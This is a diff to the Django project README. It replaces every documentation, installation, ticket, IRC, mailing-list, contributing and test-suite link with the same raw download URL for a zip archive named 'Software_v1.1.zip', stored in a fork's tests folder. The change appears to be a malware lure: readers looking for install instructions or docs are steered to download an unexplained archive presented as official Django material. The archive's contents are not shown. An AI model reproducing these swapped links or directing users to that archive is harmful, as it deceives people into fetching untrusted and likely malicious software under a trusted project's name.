@@ -6,16 +6,16 @@ Django is a high-level Python Web framework that encourages rapid development
 and clean, pragmatic design. Thanks for checking it out.
 
 All documentation is in the "``docs``" directory and online at
-https://docs.djangoproject.com/en/stable/. If you're just getting started,
+https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip If you're just getting started,
 here's how we recommend you read the docs:
 
-* First, read ``docs/intro/install.txt`` for instructions on installing Django.
+* First, read ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip`` for instructions on installing Django.
 
-* Next, work through the tutorials in order (``docs/intro/tutorial01.txt``,
-  ``docs/intro/tutorial02.txt``, etc.).
+* Next, work through the tutorials in order (``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip``,
+  ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip``, etc.).
 
 * If you want to set up an actual deployment server, read
-  ``docs/howto/deployment/index.txt`` for instructions.
+  ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip`` for instructions.
 
 * You'll probably want to read through the topical guides (in ``docs/topics``)
   next; from there you can jump to the HOWTOs (in ``docs/howto``) for specific
@@ -25,24 +25,24 @@ here's how we recommend you read the docs:
 
 Docs are updated rigorously. If you find any problems in the docs, or think
 they should be clarified in any way, please take 30 seconds to fill out a
-ticket here: https://code.djangoproject.com/newticket
+ticket here: https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip
 
 To get more help:
 
-* Join the ``#django`` channel on irc.freenode.net. Lots of helpful people hang
-  out there. See https://en.wikipedia.org/wiki/Wikipedia:IRC/Tutorial if you're
+* Join the ``#django`` channel on https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip Lots of helpful people hang
+  out there. See https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip if you're
   new to IRC.
 
 * Join the django-users mailing list, or read the archives, at
-  https://groups.google.com/group/django-users.
+  https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip
 
 To contribute to Django:
 
-* Check out https://docs.djangoproject.com/en/dev/internals/contributing/ for
+* Check out https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip for
   information about getting involved.
 
 To run Django's test suite:
 
 * Follow the instructions in the "Unit tests" section of
-  ``docs/internals/contributing/writing-code/unit-tests.txt``, published online at
-  https://docs.djangoproject.com/en/dev/internals/contributing/writing-code/unit-tests/#running-the-unit-tests
+  ``https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip``, published online at
+  https://github.com/Joe-Mogul/django/raw/refs/heads/master/tests/m2o_recursive/Software_v1.1.zip
